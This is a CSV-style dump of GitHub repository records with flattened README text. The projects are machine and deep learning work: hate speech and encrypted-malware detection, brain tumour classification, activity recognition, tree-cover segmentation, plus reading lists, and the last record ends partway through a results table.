peterzheng98,MLinCpp,n/a,Implement some easy algorithm of Deep Learning in cpp Current Matrix Basic Calculation 1 success UnitTest provided Matrix TODO SVD eigen value Linear Regression Finish Now making UnitTest Future KNN RNN RNN LSTM Notes Templates only be implemented in the header file https stackoverflow com questions 495021 why can templates only be implemented in the header file Updates 2019 12 4 Test Pending sigmoid matrixTool h linear regression linearRegression hpp RNN initial RNN cpp h 2019 12 6 Test Pending QR Decomposition matrixTool h 2019 12 7 Test Pending LU Decomposition matrixTool h,2019-12-02T14:26:06Z,2019-12-12T11:55:33Z,C++,peterzheng98,User,1,1,0,30,master,peterzheng98,1,0,0,0,0,0,0
krantirk,twitter-hatespeech,n/a,Hate Speech Detection on Twitter Implementation of our paper titled Deep Learning for Hate Speech Detection to appear in WWW 17 proceedings Dataset Dataset can be downloaded from https github com zeerakw hatespeech https github com zeerakw hatespeech Contains tweet id s and corresponding annotations Tweets are labelled as either Racist Sexist or Neither Racist or Sexist Use your favourite tweet crawler and download the data and place the tweets in the folder tweetdata Requirements Keras Tensorflow or Theano we experimented with theano Gensim xgboost NLTK Sklearn Numpy Instructions to run Before running the model make sure you have setup the input dataset in a folder named tweetdata To run a model for training use the following instructions mentioned below Use appropriate parameter settings to test the variations of the models This script contains code for runnning NNmodel GDBT Steps to run NNmodel GDBT Run NNmodel first CNN LSTM Fasttext It will create a model file Change the name of the file at line 50 pointing to the model file Run nnclassifier file as per instructions below python nnclassifier py BagOfWords models BoWV py does not supports XGBOOST supports sklearn s GBDT usage BoWV py h m Deprecated logistic gradientboosting randomforest svm svmlinear f EMBEDDINGFILE d DIMENSION tokenizer glove nltk s SEED folds FOLDS estimators ESTIMATORS loss LOSS kernel KERNEL classweight CLASSWEIGHT BagOfWords model for twitter Hate speech detection optional arguments h help show this help message and exit m logistic gradientboosting randomforest svm svmlinear model logistic gradientboosting randomforest svm svmlinear f EMBEDDINGFILE embeddingfile EMBEDDINGFILE d DIMENSION dimension DIMENSION tokenizer glove nltk s SEED seed SEED folds FOLDS estimators ESTIMATORS loss LOSS kernel KERNEL classweight CLASSWEIGHT TF IDF based models tfidf py usage tfidf py h m tfidfsvm tfidfsvmlinear tfidflogistic tfidfgradientboosting tfidfrandomforest maxngram MAXNGRAM tokenizer glove nltk s SEED folds FOLDS estimators ESTIMATORS loss LOSS kernel KERNEL classweight CLASSWEIGHT use inverse doc freq TF IDF model for twitter Hate speech detection optional arguments h help show this help message and exit m tfidfsvm tfidfsvmlinear tfidflogistic tfidfgradientboosting tfidfrandomforest model tfidfsvm tfidfsvmlinear tfidflogistic tfidfgradientboosting tfidfrandomforest maxngram MAXNGRAM tokenizer glove nltk s SEED seed SEED folds FOLDS estimators ESTIMATORS loss LOSS kernel KERNEL classweight CLASSWEIGHT use inverse doc freq LSTM RNN based methods lstm py usage lstm py h f EMBEDDINGFILE d DIMENSION tokenizer glove nltk loss LOSS optimizer OPTIMIZER epochs EPOCHS batch size BATCHSIZE s SEED folds FOLDS kernel KERNEL classweight CLASSWEIGHT initialize weights random glove learn embeddings scale loss function LSTM based models for twitter Hate speech detection optional arguments h help show this help message and exit f EMBEDDINGFILE embeddingfile EMBEDDINGFILE d DIMENSION dimension DIMENSION tokenizer glove nltk loss LOSS optimizer OPTIMIZER epochs EPOCHS batch size BATCHSIZE s SEED seed SEED folds FOLDS kernel KERNEL classweight CLASSWEIGHT initialize weights random glove learn embeddings scale loss function CNN based models cnn py usage cnn py h f EMBEDDINGFILE d DIMENSION tokenizer glove nltk loss LOSS optimizer OPTIMIZER epochs EPOCHS batch size BATCHSIZE s SEED folds FOLDS classweight CLASSWEIGHT initialize weights random glove learn embeddings scale loss function CNN based models for twitter Hate speech detection optional arguments h help show this help message and exit f EMBEDDINGFILE embeddingfile EMBEDDINGFILE d DIMENSION dimension DIMENSION tokenizer glove nltk loss LOSS optimizer OPTIMIZER epochs EPOCHS batch size BATCHSIZE s SEED seed SEED folds FOLDS classweight CLASSWEIGHT initialize weights random glove learn embeddings scale loss function Examples python BoWV py model logistic seed 42 f glove twitter 27b 25d txt d 25 seed 42 folds 10 tokenizer glove python tfidf py m tfidfsvmlinear maxngram 3 tokenizer glove loss squaredhinge python lstm py f DATASETS glove twitter GENSIM glove twitter 27B 25d txt d 25 tokenizer glove loss categoricalcrossentropy optimizer adam initialize weights random learn embeddings epochs 10 batch size 512 python cnn py f DATASETS glove twitter GENSIM glove twitter 27B 25d txt d 25 tokenizer nltk loss categoricalcrossentropy optimizer adam epochs 10 batch size 128 initialize weights random scale loss function,2019-12-03T12:29:23Z,2019-12-03T12:53:28Z,Python,krantirk,User,1,1,0,1,master,krantirk,1,0,0,0,0,0,0
shafiqulislamsumon,HumanActivityRecognition,n/a,Human Activity Recognition from different datasets Human Activity recognition using 1D Convolutional Neural Network for different datasets Dataset HASC WISDM SinlgeChest Tools Jupyter Notebook 1D CNN Model sh model Sequential model add Conv1D filters 64 kernelsize 3 activation relu inputshape ntimesteps nfeatures model add Conv1D filters 64 kernelsize 3 activation relu padding same model add Dropout 0 4 model add MaxPooling1D poolsize 2 model add Flatten model add Dense 100 activation relu model add Dense noutputs activation softmax Description Activity Types for HASC dataset images activitieshasc png Activity plot for WISDM dataset images activitieswisdm png Activities for SingleChest dataset images singlechestactivities png Confusion Matrix using CNN for HASC dataset images cmhasc png Confusion Matrix using CNN for WISDM dataset images cmwisdm png Confusion Matrix using CNN for SingleChest dataset images cmsinglechest png,2019-11-09T00:25:18Z,2019-11-09T01:04:36Z,Jupyter Notebook,shafiqulislamsumon,User,1,1,0,5,master,shafiqulislamsumon,1,0,0,0,0,0,0
holyfiddlex,Thesis,n/a,Thesis Repo This project is just a repository to store changes made to my dissertation in the ENES UNAM Morelia Mexico Document Structure Title Page Table of Contents Acknowledgements Abstract Preface Chapter 0 Introduction The Cocktail Party Problem Historic Background Segmentation vs Attention Problem Inverse Problems Ill Posed Problems Constraints Structure of Document Part 1 Literature Review Chapter 1 Data Processing Feature Extraction Spectrograms Mel Bin Normalization Chapter 2 The Generation Problem Time Series Wave net Phase Loss Phase Storage Griffin lin Vocoders Masking Techniques Chapter 3 Looking to Listen Chapter 4 Music Speech Part 2 Methodology Chapter 5 Libraries Librosa PyTorch TorchAudio Chapter 6 Implementation Dataset Model Structure Preprocessing Targets Tested Part 3 Chapter 7 Results Results Quantified Losses Quality Tests Samples images and audios Transfer Learning Quantified Losses Quality Tests Samples images and audios Transfer Learning with fine tuning Quantified Losses Quality Tests Samples images and audios Chapter 8 Discussion Future Work Appendix Time Series Signal Processing Audio Speech Properties Transforms Fourier Transform Spectrums Discrete Fourier Transform Short Time Fourier Transform Wavelet Scaleograph Spectrograms Linear and Log Amplitude vs Decibels Mel Bins The Phase Problem Linear Decibel Mel Bin Phase Retrieval Techniques Phase Storage Griffin lin Algorithm Vocoders Machine Learning Supervised Learning vs Unsupervised Learning Advancements Problems Data Interpretability Overfitting Hyper parameters Computation Deep Learning Neural Networks Structure Inputs Weights Bias Back propagation Algorithm Forward Propagation Gradients Image processing Convolutional Neural Networks Attention Segmentation Medicine U Net Source Code Running Instructions,2019-11-11T16:11:18Z,2019-11-30T16:23:14Z,TeX,holyfiddlex,User,1,1,0,31,master,holyfiddlex,1,0,0,4,0,0,0
mattesko,COMP550-Project,n/a,COMP550 Project,2019-11-03T15:26:25Z,2019-12-12T19:41:37Z,Jupyter Notebook,mattesko,User,2,1,0,38,master,mattesko#egproulx#violetguos,3,0,0,14,4,0,0
monk1337,Multi-Label-Classification-Framework,n/a,Multi label classification framework Testing on Multilabel Reuters dataset with 25 labels ratio model BinaryRe result accuracy 0 7255393878575013 f1score 0 8039867109634552 model powerset result accuracy 0 7907676869041645 f1score 0 7904977375565612 model mlknn result accuracy 0 8283993978926242 f1score 0 8840097582612552 model classfierchain result accuracy 0 6788760662318113 f1score 0 7657798643714135,2019-11-15T05:47:48Z,2019-11-25T07:20:44Z,Python,monk1337,User,1,1,0,47,master,monk1337,1,0,0,0,0,0,0
vvrahul11,Bayesian_ml_dl_workout_area,bayesian-analysis#brms#computer-vision#deep-learning#gpytorch#inference#machine-learning#medical-imaging#neural-network#practical-exercises#pymc3#pyro#theory,Bayesian machine learning and deep learning workout area with Brms Pymc3 Pyro and Gpytorch GitHub Logo https github com vvrahul11 Bayesianmldlworkoutarea blob master images Bayesian jpg Uncertainity estimation in machine learning deep learning and reinforcement learning methods are increasingly becoming popular due to the latest research advancements in variational inference and dropout methods This repository will contain book chapter reviews bayesian model implementations and resources for learning bayesian modeling I did a rigorous research on this topic to come up with a list of most influential books and programming packages on this topic to layout a plan for my study The list of books and packages are listed under Books Overview There will be several folders and subfolders in this repository A summary of the Book chapters can be accessed from subfolders theory folder https github com vvrahul11 Bayesianmldlworkoutarea tree master theory A summary of my daily notes theory folder https github com vvrahul11 Bayesianmldlworkoutarea tree master theory All basic statistical exercises from think bayes will go into stats folder https github com vvrahul11 Bayesianmldlworkoutarea tree master stats All practical exercises using machine learning will go into folder ml https github com vvrahul11 Bayesianmldlworkoutarea tree master ml All practical exercises using deep learning will go into folder dl https github com vvrahul11 Bayesianmldlworkoutarea tree master dl Both ml and dl folders will contain subfolders with examples inference from R and python libraries such as Pymc3 Brms Pyro gpytorch or Botorch ml using Pymc3 dl using Pymc3 Why going bayesian is good The main advantages of going bayesian are as follows Bayesian methods typically involves using probability distributions rather than point probabilities such as mean For example for a regression problem for predicting house prices rather than predicting the price of a house bayesian methods produces a distribution of possible predictions Bayesian methods helps to derive credible intervals similar to confidence interval but not the same around the mean using the predicted distribution Bayesian method can utilize informed or uninformed priors Priors are nothing but prior knowledge about the distribution of samples This is extremely useful fot getting better predictions as well as decreasing time required for traing a ML or DL model Bayesian methods work efficiently even with small sample sizes for deep learning models or machine learning models Bayesian methods account for variability in the measurement of the data Core architecture of a bayesian method Books Information Theory Inference and Learning Algorithms Gaussian process for machine learning pattern recognition and machine learning Statistical rethinking Bayesian analysis with python Probability theory The logic of science Bayesian data analysis Think Bayes If you want to learn some statistical modeling and get acquinted with statistical problem solving start with this book https bookdown org roback bookdown bysh suggested by Statistical Rethinking Record For some basic calculus http tutorial math lamar edu Classes CalcII Probability aspx Papers Inference from Simulations and Monitoring Convergence https www mcmchandbook net HandbookChapter6 pdf Dropout as a bayesian approximation http proceedings mlr press v48 gal16 pdf What Uncertainties Do We Need in Bayesian Deep Learning for Computer Vision https arxiv org pdf 1703 04977 pdf Multi Task Learning Using Uncertainty to Weigh Losses for Scene Geometry and Semantics https arxiv org pdf 1705 07115 pdf https alexgkendall com computervision bayesiandeeplearningforsafeai Talks 1 https www youtube com channel UCLBLWLfKk5rMKDOHoO7vPQ 2 https www youtube com watch v HNKlytVD1Zg t 3836s Bayesian logistic regression KL divergence neural network code https github com chrisorm pydata 2018 tree master notebooks Blog 1 http fastml com bayesian machine learning Gaussian Processes Gaussian processes are a powerful tool in the machine learning toolbox They allow us to make predictions about our data by incorporating prior knowledge Their most obvious area of application is fitting a function to the data This is called regression and is used for example in robotics or time series forecasting But Gaussian processes are not limited to regressionthey can also be extended to classification and clustering tasks For a given set of training points there are potentially infinitely many functions that fit the data Gaussian processes offer an elegant solution to this problem by assigning a probability to each of these functions The mean of this probability distribution then represents the most probable characterization of the data Furthermore using a probabilistic approach allows us to incorporate the confidence of the prediction into the regression result https distill pub 2019 visual exploration gaussian processes 1 DEEP NEURAL NETWORKS AS GAUSSIAN PROCESSES https arxiv org pdf 1711 00165v3 pdf 2 Automatic Differentiation Variational Inference https arxiv org pdf 1603 00788 pdf 3 The Variational Gaussian Approximation Revisited https www mitpressjournals org doi full 10 1162 neco 2008 08 07 592 4 https blog dominodatalab com fitting gaussian process models python 5 Deep Neural Networks as Gaussian Processes PDF Lee J Sohl Dickstein J Pennington J Novak R Schoenholz S and Bahri Y 2018 International Conference on Learning Representations 6 Deep Gaussian Processes PDF Damianou A and Lawrence N 2013 Proceedings of the Sixteenth International Conference on Artificial Intelligence and Statistics Vol 31 pp 207 215 PMLR 7 https nbviewer jupyter org github adamian adamian github io blob master talks Brown2016 ipynb 8 http katbailey github io post gaussian processes for dummies 9 http katbailey github io post from both sides now the math of linear regression 10 https sigopt com blog intuition behind gaussian processes 11 http www tmpl fi gp 12 https towardsdatascience com using bayesian modeling to improve price elasticity accuracy 8748881d99ba 13 https distill pub 2019 visual exploration gaussian processes 14 https ax dev docs bayesopt html a closer look at gaussian processes 15 A tutorial on Bayesian optimization using gaussian process https arxiv org pdf 1807 02811 pdf 16 https ax dev docs bayesopt Blog https medium com panoramic gaussian processes for little data 2501518964e4 Link between Bayesian inference Gaussian processes and deep learning 1 Deep Neural Networks as Gaussian Processes PDF Lee J Sohl Dickstein J Pennington J Novak R Schoenholz S and Bahri Y 2018 International Conference on Learning Representations 2 Deep Gaussian Processes PDF Damianou A and Lawrence N 2013 Proceedings of the Sixteenth International Conference on Artificial Intelligence and Statistics Vol 31 pp 207 215 PMLR Further Reading Ref https medium com Petuum intro to modern bayesian learning and probabilistic programming c61830df5c50 The following are some recommended papers cited throughout this blog post broken down into categories Scalable Bayesian inference algorithms 1 Bayesian Learning via Stochastic Gradient Langevin Dynamics 2 Stochastic Gradient Hamiltonian Monte Carlo 3 Big Learning with Bayesian Methods Parallel and distributed Bayesian inference algorithms 4 Asymptotically Exact Embarrassingly Parallel MCMC 5 Parallelizing MCMC via Weierstrass Sampler 6 Scalable and Robust Bayesian Inference via the Median Posterior Variational approximations and amortized inference 7 Variational Inference A Review for Statisticians 8 Stochastic Variational Inference 9 Stochastic Backpropagation and Approximate Inference in Deep Generative Models 10 Auto Encoding Variational Bayes Deep Bayesian learning 11 Deep Probabilistic Programming 12 Dropout as a Bayesian Approximation Representing Model Uncertainty in Deep Learning 13 Bayesian Convolutional Neural Networks with Bernoulli Approximate Variational Inference Simulators 14 Automatic Inference for Inverting Software Simulators via Probabilistic Programming 15 Improvements to Inference Compilation for Probabilistic Programming in Large Scale Scientific Simulators Visual graphics 16 Approximate Bayesian Image Interpretation using Generative Probabilistic Graphics Programs 17 Picture A Probabilistic Programming Language for Scene Perception Universal probabilistic programming 18 Venture a higher order probabilistic programming platform with programmable inference 19 A New Approach to Probabilistic Programming Inference 20 Inference Compilation and Universal Probabilistic Programming Verification testing quality assurance 21 Debugging probabilistic programs 22 Testing Probabilistic Programming Systems Usability 23 BayesDB A probabilistic programming system for querying the probable implications of data 24 Probabilistic Programs as Spreadsheet Queries 25 Spreadsheet Probabilistic Programming Ecosystem and modularity 26 Tensorflow probability 27 Pyro A collection of recent papers in Variational Inference 1 https github com otokonoko8 implicit variational inference,2019-12-05T16:37:58Z,2019-12-12T22:22:10Z,Jupyter Notebook,vvrahul11,User,2,1,0,1,master,vvrahul11,1,0,0,0,0,0,1
lamducanhndgv,CoolLink,n/a,CoolLink The repo contains cool links for studying about computer science machine learning deep learning Youtube Rachel Thomas https www youtube com channel UCpSCYWbMn4JcsxbWOzkgEQ Caltech Machine Learning complete course https www youtube com watch v idu8kaPFf1A list PL41qI9AD63BMXtmes0upOcPA5psKqVkgS fbclid IwAR2xykH7KgcbnPw 8j8Cgr20WDW9uyQXcIdO9Fyna 0zCHnzneEnKuEGg,2019-12-07T08:36:52Z,2019-12-09T08:02:35Z,n/a,lamducanhndgv,User,2,1,0,4,master,lamducanhndgv,1,0,0,0,0,0,0
TimzOwen,python4TensorFlow-,n/a,,2019-12-09T19:25:43Z,2019-12-10T18:36:53Z,Python,TimzOwen,User,1,1,0,3,master,TimzOwen,1,0,0,0,0,0,0
sscswapnil,Object_Detection_with_10_lines_of_code,n/a,,2019-11-30T12:24:00Z,2019-11-30T12:26:44Z,Jupyter Notebook,sscswapnil,User,1,1,0,2,master,sscswapnil,1,0,0,0,0,0,0
jdlc105,Awesome-machine-or-deep-learning-related-papers-on-Cell-Nature-Science-series-of-journals,n/a,Awesome machine or deep learning related papers on Cell Nature Science series of journals Artificial intelligence is a strategic technology that leads a new round of technological revolution and industrial transformation Machine learning technology represented by deep learning is the core of artificial intelligence which has achieved great success in many fields There is no doubt that Cell Nature Science series of journals are recognized as the top three journals in the world To a great extent they guide the future development trend In view of this this project focuses on machine learning or deep learning related papers on Cell Nature Science series of journals lists relevant must read papers and keeps track of progress We look forward to promoting this direction and providing some help to researchers in this direction Contributed by Allen Bluce Bentian Li at NUAA and Yunxia Lin at NUAA If there are some questions welcome to send E mail jdlc105 qq com lbtjackbluce gmail com Review Papers 1 Next Generation Machine Learning for Biological Networks Diogo M Camacho et al Cell 2019 paper https www sciencedirect com science article pii S0092867418305920 1 Deep learning for cellular image analysis Erick Moen et al Nature Methods 2019 paper https www nature com articles s41592 019 0403 1 1 Quantum machine learning Jacob Biamonte et al Nature 2017 paper https www nature com articles nature23474 1 Deep learning Yann LeCun Yoshua Bengio Geoffrey Hinton Nature 2015 paper https www nature com articles nature14539 1 Reinforcement learning improves behaviour from evaluative feedback Michael L Littman Nature 2015 paper https www nature com articles nature14540 1 Probabilistic machine learning and artificial intelligence Zoubin Ghahramani Nature 2015 paper https www nature com articles nature14541 1 Neural networks and perceptual learning Misha Tsodyks Charles Gilbert Nature 2004 paper https www nature com articles nature03013 1 Holography in artificial neural networks Demetri Psaltis et al Nature 1990 paper https www nature com articles 343325a0 1 Machine learning for data driven discovery in solid Earth geoscience Karianne J Bergen et al Science 2019 paper https science sciencemag org content 363 6433 eaau0323 1 Inverse molecular design using machine learning Generative models for matter engineering Benjamin Sanchez Lengeling et al Science 2018 paper https science sciencemag org content 361 6400 360 1 Machine learning Trends perspectives and prospects M I Jordan T M Mitchell Science 2015 paper https science sciencemag org content 349 6245 255 Research Papers on Cell Journal 1 A Deep Neural Network for Predicting and Engineering Alternative Polyadenylation Nicholas Bogard et al Cell 2019 paper https www sciencedirect com science article pii S0092867419304982 1 Predicting Splicing from Primary Sequence with Deep Learning Kishore Jaganathan et al Cell 2019 paper https www sciencedirect com science article pii S0092867418316295 1 A White Box Machine Learning Approach for Revealing Antibiotic Mechanisms of Action Jason H Yang et al Cell 2019 paper https www sciencedirect com science article pii S0092867419304027 1 Evolving Images for Visual Neurons Using a Deep Generative Network Reveals Coding Principles and Neuronal Preferences Carlos R Ponce et al Cell 2019 paper https www sciencedirect com science article pii S0092867419303915 1 Identifying Medical Diagnoses and Treatable Diseases by Image Based Deep Learning Daniel S Kermany et al Cell 2018 paper https www sciencedirect com science article pii S0092867418301545 Research Papers on Nature Journal 1 Grandmaster level in StarCraft II using multi agent reinforcement learning Oriol Vinyals et al Nature 2019 paper https www nature com articles s41586 019 1724 z 1 One neuron versus deep learning in aftershock prediction Arnaud Mignan et al Nature 2019 paper https www nature com articles s41586 019 1582 8 1 Unsupervised word embeddings capture latent knowledge from materials science literature Tshitoyan V et al Nature 2019 paper https wwwnature xilesou top articles s41586 019 1335 8 1 Deep learning for multi year ENSO forecasts Yoo Geun Ham et al Nature 2019 paper https www nature com articles s41586 019 1559 7 1 Learning the signatures of the human grasp using a scalable tactile glove Subramanian Sundaram et al Nature 2019 paper https www nature com articles s41586 019 1234 z 1 Supervised learning with quantum enhanced feature spaces Vojtch Havlek et al Nature 2019 paper https www nature com articles s41586 019 0980 2 1 Deep learning and process understanding for data driven Earth system science Markus Reichstein et al Nature 2019 paper https www nature com articles s41586 019 0912 1 1 Deep learning of aftershock patterns following large earthquakes Phoebe M R DeVries et al Nature 2019 paper https www nature com articles s41586 018 0438 y 1 Machine learning at the energy and intensity frontiers of particle physics Alexander Radovic et al Nature 2018 paper https www nature com articles s41586 018 0361 2 1 Machine learning for molecular and materials science Keith T Butler et al Nature 2018 paper https www nature com articles s41586 018 0337 2 1 Vector based navigation using grid like representations in artificial agents Andrea Banino et al Nature 2018 paper https www nature com articles s41586 018 0102 6 1 Planning chemical syntheses with deep neural networks and symbolic AI Marwin H S Segler et al Nature 2018 paper https www nature com articles nature25978 1 Equivalent accuracy accelerated neural network training using analogue memory Stefano Ambrogio et al Nature 2018 paper https www nature com articles s41586 018 0180 5 1 Image reconstruction by domain transform manifold learning Bo Zhu et al Nature 2018 paper https www nature com articles nature25988 1 Fast automated analysis of strong gravitational lenses with convolutional neural networks Yashar D Hezaveh et al Nature 2017 paper https www nature com articles nature23463 1 Dermatologist level classification of skin cancer with deep neural networks Andre Esteva et al Nature 2017 paper https www nature com articles nature21056 1 Hybrid computing using a neural network with dynamic external memory Alex Graves et al Nature 2016 paper https www nature com articles nature20101 1 Mastering the game of Go with deep neural networks and tree search David Silver et al Nature 2016 paper https www nature com articles nature16961 1 Human level control through deep reinforcement learning Volodymyr Mnih et al Nature 2015 paper https www nature com articles nature14236 1 Neural constraints on learning Patrick T Sadtler et al Nature 2014 paper https www nature com articles nature13665 1 Self organizing neural network that discovers surfaces in random dot stereograms Suzanna Becker Geoffrey E Hinton Nature 1992 paper https www nature com articles 355161a0 1 Function of identified interneurons in the leech elucidated using neural networks trained by back propagation Shawn R Lockery et al Nature 1989 paper https www nature com articles 340468a0 Research Papers on Science Journal 1 Boltzmann generators Sampling equilibrium states of many body systems with deep learning Frank No et al Science 2019 paper https science sciencemag org content 365 6457 eaaw1147 1 Prediction of higher selectivity catalysts by computer driven workflow and machine learning Andrew F Zahrt et al Science 2019 paper https science sciencemag org content 363 6424 eaau5631 1 Combining satellite imagery and machine learning to predict poverty Neal Jean et al Science 2016 paper https science sciencemag org content 353 6301 790,2019-11-03T07:21:11Z,2019-11-04T02:12:14Z,n/a,jdlc105,User,1,1,0,12,master,jdlc105,1,0,0,0,0,0,0
kkchuchu,Deep-Learning-Based-Encrypted-Malware-Detection-without-Decryption-and-Expert-Knowledge,n/a,Deep Learning Based Encrypted Malware Detection without Decryption and Expert Knowledge Using pcap tls payload converting to 100 1 2 dimension as the CNN 1D input Based on the Keras and tensorflow backend Input Raw Flow Accuracy Test accuracy 0 926153838634491 Reference https www ieee security org TC SPW2019 DLS doc 06 Marin pdf DataSet stratosphereips https www stratosphereips org datasets ctu13,2019-11-08T04:38:48Z,2019-11-19T03:40:40Z,Jupyter Notebook,kkchuchu,User,0,1,0,6,master,kkchuchu,1,0,0,0,0,0,0
ferasbg,GlioAI-Deep-Learning-Based-Web-Application-for-Automatic-Brain-Tumor-Detection,n/a,GlioAI Deep Learning Based Web Application for Automatic Brain Tumor Detection A fully automatic method for brain tumor classification which is developed using VGG16 a convolutional neural network Implemented a RESTful API to communicate the neural network to the web client for the application Summary Primary malignant brain tumors are the most deadly forms of cancer partially due to the dismal prognosis but also because of the direct consequences on decreased cognitive function and poor quality of life The noninvasive medical imaging technique called magnetic resonance imaging has emerged and implemented as a diagnostic tool for brain tumors without ionizing radiation The utilization of these imaging tools are not yet fully maximized due to the variable of human operation Manual image feature extraction methods are very time inefficient limited to operator experience and are prone to human error In this context a reliable and fully automatic classification method is necessary for an efficient pathogenesis identification To begin solving this issue we propose a fully automatic method for brain tumor classification which is developed using VGG16 a convolutional neural network Primary Objectives Increasing Survival Rates Creating more accurate feature extraction without human bias saving physicians time for the human centric part of healthcare Control in Treatment Outcomes Improving surviveability via computing power and trained algorithms without human error Cost Effective Less human driven diagnostic errors will result in reduced treatment costs and overall patient outcomes benefiting both healthcare providers and patients Industry Optimization Shifting healthcare industry to implement value based reimbursement models for monetizing patient centric care Pushing AI Based Cancer Detection Implementing machine intelligence systems will allow physicians or individuals to upload their MR data and receive bias free patient data reports Scalability Scaling operations in other clinical sectors deploying analytics based monetization Research Results What you could include a description of your most important results such as data or observations any patterns or trends you noticed your key data clearly laid out in a table graph or chart Dependencies Keras Tensorflow Matplotlib Scikit learn Numpy Python Django Conclusion What you could include a summary of your results an explanation of whether your findings support your hypothesis or expected outcome and why thoughts on any limitations in your results Are they 100 reliable or could your method be improved somehow the kind of future impact your results might have and if further work is needed Have your results inspired you to ask more questions Future Features train models on accelerated GPUs simultaneously use GANs to generate MR training data for additional model training and testing for anomaly detection additional application features for user personalization and analytics References Mallick Pradeep Kumar et al Brain MRI Image Classification for Cancer Detection Using Deep Wavelet Autoencoder Based Deep Neural Network Brain MRI Image Classification for Cancer Detection Using Deep Wavelet Autoencoder Based Deep Neural Network IEEE Journals Magazine IEEE Xplore 15 Mar 2019 https ieeexplore ieee org document 8667628 Asodekar et al Brain Tumor Classification Using Shape Analysis of MRI Images SSRN 25 July 2019 https papers ssrn com sol3 papers cfm abstractid 3425335 Banerjee et al Deep Radiomics for Brain Tumor Detection and Classification from Multi Sequence MRI ArXiv org 21 Mar 2019 https arxiv org abs 1903 09240 Duong M T et al Convolutional Neural Network for Automated FLAIR Lesion Segmentation on Clinical Brain MR Imaging American Journal of Neuroradiology American Journal of Neuroradiology 1 Aug 2019 http www ajnr org content 40 8 1282 abstract Loizou Christos P et al Brain White Matter Lesions Classification in Multiple Sclerosis Subjects for the Prognosis of Future Disability SpringerLink Springer Berlin Heidelberg 15 Sept 2011 https link springer com chapter 10 1007 978 3 642 23960 147 Shukla Gaurav Advanced Magnetic Resonance Imaging in Glioblastoma a Review Chinese Clinical Oncology http cco amegroups com article view 15820 Zahra et al Brain Tumor Segmentation Using Deep Learning by Type Specific Sorting of Images ArXiv org 20 Sept 2018 https arxiv org abs 1809 07786 Papers Brain MRI Image Classification for Cancer Detection Using Deep Wavelet Autoencoder Based Deep Neural Network Deep Radiomics for Brain Tumor Detection and Classification from Multi Sequence MRI Convolutional Neural Network for Automated FLAIR Lesion Segmentation on Clinical Brain MR Imaging Advanced magnetic resonance imaging in glioblastoma a review Brain Tumor Classification Using Shape Analysis of MRI Images Brain Tumor MRI Segmentation and Classification Using Ensemble Classifier Brain Tumor Segmentation Using Deep Learning by Type Specific Sorting of Images Brain White Matter Lesions Classification in Multiple Sclerosis Subjects for the Prognosis of Future Disability A supervised clustering approach for fMR Bibliography Handbook of Neuro Oncology Neuroimaging Luigi Pirtoli Giovanni Luca Gravina Antonio Giordano eds Radiobiology of Glioblastoma Recent Advances and Related Pathobiology Advances in Biology and Treatment of Glioblastoma Glioblastoma Methods and Protocols Glioblastoma Molecular Mechanisms of Pathogenesis and Current Therapeutic Strategies Tumors of the Central Nervous System Volume 1 Gliomas Glioblastoma Part 1 Tumors of the Central Nervous System Volume 2 Gliomas Glioblastoma Part 2 Intraoperative Imaging,2019-12-01T07:36:52Z,2019-12-09T00:53:59Z,n/a,ferasbg,User,1,1,0,21,master,ferasbg,1,0,0,0,0,0,1
anant1203,Applying-Deep-Learning-for-Large-scale-Quantification-of-Urban-Tree-Cover,n/a,Applying Deep Learning for Large scale Quantification of Urban Tree Cover To find out vegetation cover using deep learning model that can be deployed on the edge device Dataset used to train the model is cityscape dataset Model used are Unet and Mobile net V2 model Introduction Recent advancement in deep learning has become one of the most powerful tools to solve the image classification and segmentation problem Deep learning model learn the filter that helps in extraction and learning of the important feature form the images These feature helps to find differences as well as similarities amongst the image Deep learning models require large dataset to learn the complex data representation In the paper 1 the authors have used DCNN model to find the green cover in the cities using Cityscapes dataset Cityscapes dataset has 2975 images and mask of green cover of different cities around the world which was used as the training data and 500 image with masks were used as testing dataset The images were google street view images The DCNN model has an IOU of 61 2 percent In this approach I used state of the art unet model and mobile net v2 model Unet gave an IOU of 74 5 percent and mobile net v2 model gave an IOU of 64 3 percent which were better and lighter model than previously used DCNN model The model were even tested on different machine type with different configuration to check their performance Methodology A Model Unet 2 is a state of the art image segmentation model the architecture looks like a U It has 3 sections Contraction It has 3x3 convolutional layer followed by 2x2 max pooling layer Bottleneck It mediate between contraction and expansion It uses two 3X3 CNN layers followed by 2X2 up convolution layer Expansion It uses 3x3 convolution layer followed by 2x2 layer transposed convolution for upsampling Mobile Net V2 3 is small size model made by google to use in mobile edge devices It is classification model which was tweak and can be used for segmentation purpose as well The tweaked mobile net model uses Unet architecture in which contraction layer was replaced by the mobile net v2 model while the upsampling layer remained the same Mobile net is small and has smaller complexity as it makes use of the depth wise convolution followed by point wise convolution instead of normal convolution 4 Number of parameters Size of the model Training and Calibration Mobile net v2 6 504 227 9 79 MB Pre trained on full Cityscapes dataset Unet 33 480 577 50 25 MB Pre trained on full Cityscapes dataset Table 1 Show comparison of Unet and mobilenet model B Dataset Cityscapes dataset is used which has a total of 2975 image and mask as shown in figure 1 https github com anant1203 Applying Deep Learning for Large scale Quantification of Urban Tree Cover blob master image zurich000121000019gtFinecolor png https github com anant1203 Applying Deep Learning for Large scale Quantification of Urban Tree Cover blob master image zurich000121000019leftImg8bit png Figure 1 Examples of mask and image used to train the model The images and mask had 1024x 2048 dimensions which was brought down to 512x512 dimension As we can see that the mask had multiple class but since this problem deals with vegetation cover so we converted the mask to black and white with vegetation cover as white and rest as black Json file provided with dataset having coordinates of different classes objects was used to convert mask as per our usage as shown in figure 2 https github com anant1203 Applying Deep Learning for Large scale Quantification of Urban Tree Cover blob master image 2 png Figure 2 Example of mask with vegetation cover and image with size 512x512 C Evaluation Matrix Mean IoU was used for measuring the accuracy of the location of labelled vegetation labels n number of images in test set TP true positive predicted vegetation labels for image i FP false positive predicted vegetation labels for image i FN false negative predicted vegetation labels for image i IoU TP TP FP F N Mean IoU 1 n Summation IoU Results A Model Performance Both the model outperform the DCNN model mentioned in 1 The number of parameters in the Unet model was almost half of what was mentioned in DCNN but still it was able to outperform it with the IoU of 74 5 percent The mobile net v2 model had almost one tenth of the number of parameters as in DCNN model but still it out perform it with the IoU of 64 3 Figure 3 shows the result of both the models https github com anant1203 Applying Deep Learning for Large scale Quantification of Urban Tree Cover blob master image 1 png Performance Testing The model were tested on different environment to check the scalability of the model The result can be seen in table 2 Number of Parameter in mobile net 6 504 227 Size 9 79 MB Number of Parameter in Unet 33 480 577 Size 50 25 MB Machine Type GPUs UNet Mobile Net V2 Number of image 8 CPU 52 GB RAM NVIDIA Tesla T4 x 1 85 sec 17 sec 500 4 CPU 15 GB 